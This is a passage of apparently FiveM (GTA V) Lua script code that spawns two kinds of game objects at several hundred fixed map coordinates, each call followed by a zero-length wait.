        CreateObject(3295673357, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(3295673357, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -96.965911865234, -1342.0460205078, 29.339040756226, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -133.09577941895, -1528.0103759766, 34.214588165283, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -135.51835632324, -1735.9741210938, 30.103620529175, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 93.584823608398, -1915.9150390625, 20.741292953491, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 154.10935974121, -1792.9288330078, 28.996482849121, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 238.47276306152, -1713.8931884766, 29.075937271118, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 207.06182861328, -1607.7380371094, 29.330911636353, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 232.4162902832, -1420.3079833984, 29.242002487183, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 222.65469360352, -1297.1281738281, 29.314462661743, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 219.94142150879, -1047.5908203125, 29.360450744629, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 305.37609863281, -800.81658935547, 29.339599609375, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 415.33599853516, -523.46160888672, 9.137152671814, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 513.70617675781, -266.5309753418, 47.488845825195, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 601.40679931641, 37.490180969238, 90.777885437012, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 648.3603515625, 217.51800537109, 97.319801330566, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 667.48309326172, 325.80426025391, 116.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 823.17126464844, 203.20741271973, 81.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 872.45971679688, 139.58018493652, 72.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 785.41644287109, 26.121658325195, 62.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 683.43371582031, -143.50646972656, 46.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 605.70526123047, -289.50973510742, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 516.56384277344, -379.41500854492, 36.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 439.98226928711, -454.90103149414, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 312.71276855469, -485.09936523438, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 189.06901550293, -607.71380615234, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 80.306671142578, -616.57965087891, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 55.985382080078, -686.974609375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 32.928806304932, -736.70056152344, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -4.1130304336548, -763.57354736328, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -37.031120300293, -755.37908935547, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -77.169891357422, -743.74078369141, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -105.80905151367, -722.05706787109, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -142.09321594238, -699.48010253906, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -179.060463867, -676.13171386719, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -219.05352783203, -668.16857910156, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -244.68600463867, -654.99914550781, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -242.65994262695, -615.35284423828, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -226.61053466797, -576.61193847656, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -204.27388000488, -525.74761962891, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -194.17991638184, -488.07662963867, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -191.74856567383, -441.53875732422, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -163.73318481445, -407.77178955078, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -150.57876586914, -363.31097412109, 34.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -117.31154632568, -300.70907592773, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -112.46209716797, -270.09036254883, 42.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -105.26519012451, -231.9108581543, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -96.305992126465, -208.57139587402, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -82.840637207031, -169.92846679688, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -78.284744262695, -145.34693908691, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -61.337020874023, -53.904315948486, 63.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -3.1353807449341, 119.09279632568, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 29.801212310791, 212.17195129395, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 50.15075302124, 240.48179626465, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 132.52355957031, 209.7177734375, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 267.68319702148, 177.27178955078, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 399.44277954102, 256.72280883789, 104.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 262.4895324707, 433.08334350586, 121.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 153.71487426758, 470.01754760742, 145.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -202.96701049805, 510.14642333984, 133.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -356.908203125, 521.6982421875, 125.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -419.99758911133, 548.14184570312, 123.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -626.81494140625, 690.35791015625, 151.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -886.74847412109, 861.11743164062, 200.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -740.39318847656, 617.63140869141, 141.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -708.70819091797, 572.42120361328, 148.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 27.549457550049, 247.41278076172, 110.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 184.12426757812, 190.31451416016, 106.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 347.67337036133, 132.57824707031, 105.43519592285, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 496.16052246094, 76.790908813477, 95.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 665.72528076172, 19.524644851685, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 840.81793212891, -88.717002868652, 83.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 975.80151367188, -173.63159179688, 74.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1101.4017333984, -237.70246887207, 68.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1199.4383544922, -307.15908813477, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1213.1346435547, -378.9147644043, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1267.9310302734, -545.39172363281, 71.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1367.3148193359, -580.54962158203, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1346.5030517578, -640.51617431641, 75.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1292.5853271484, -724.26849365234, 66.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1244.8343505859, -751.23809814453, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1201.3557128906, -755.33068847656, 61.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1170.6009521484, -838.49493408203, 54.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1165.1292724609, -950.17291259766, 47.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1177.6690673828, -1049.4836425781, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1198.9270019531, -1102.0579833984, 41.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1239.6254882812, -1197.4761962891, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1243.2370605469, -1258.1798095703, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1227.9265136719, -1343.5604248047, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1233.1948242188, -1396.0324707031, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1260.0971679688, -1450.5186767578, 35.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1279.4130859375, -1515.7213134766, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1344.0708007812, -1611.6140136719, 55.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1391.5943603516, -1700.3395996094, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1406.8663330078, -1762.0474853516, 65.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1427.9632568359, -1876.1088867188, 73.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1356.7377929688, -1986.7507324219, 59.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1246.3970947266, -2045.0302734375, 44.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1105.5281982422, -2072.205078125, 38.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 1031.8028564453, -2077.447265625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 891.376953125, -2072.0400390625, 32.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 755.24206542969, -2052.04296875, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 655.8369140625, -2045.7436523438, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 559.25738525391, -2039.2030029297, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 440.89465332031, -2107.9562988281, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 339.88040161133, -2158.240234375, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 110.77151489258, -2037.2709960938, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -5.143045425415, -2040.0140380859, 18.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -127.17023468018, -2074.2487792969, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -245.7915802002, -2127.5544433594, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -343.80313110352, -2088.5659179688, 24.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -449.30569458008, -2042.1713867188, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -570.93609619141, -1975.4478759766, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -699.91467285156, -1881.1365966797, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -735.6982421875, -1807.0490722656, 28.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -745.45098876953, -1719.0440673828, 29.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -735.30694580078, -1635.3673095703, 22.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -647.47534179688, -1493.9672851562, 13.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -634.03802490234, -1375.2749023438, 10.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -555.75628662109, -1287.1246337891, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -525.64581298828, -1241.2718505859, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(841438406, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
